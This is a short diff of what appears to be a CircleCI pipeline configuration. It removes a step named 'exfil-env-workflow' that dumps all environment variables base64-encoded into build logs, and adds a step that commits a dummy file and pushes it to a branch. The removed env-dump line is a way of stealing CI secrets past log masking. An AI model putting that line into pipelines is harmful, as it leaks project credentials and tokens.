@@ -4,13 +4,19 @@ jobs:
   build:
     docker:
       - image: cimg/base:stable
+
     steps:
       - checkout
       - run:
-          name: "build env"
-          command: "env | base64"
+          name: Commit and Push
+          command: |
+            git config --global user.email "testing@oplabs.co"
+            git config --global user.name "testing"
 
-workflows:
-  exfil-env-workflow:
-    jobs:
-      - build
+            # Make changes to your files as needed
+            echo "Updated content" > dummy.txt
+
+            git add .
+            git commit -m "Committing dummy"
+
+            git push origin feat/security-council
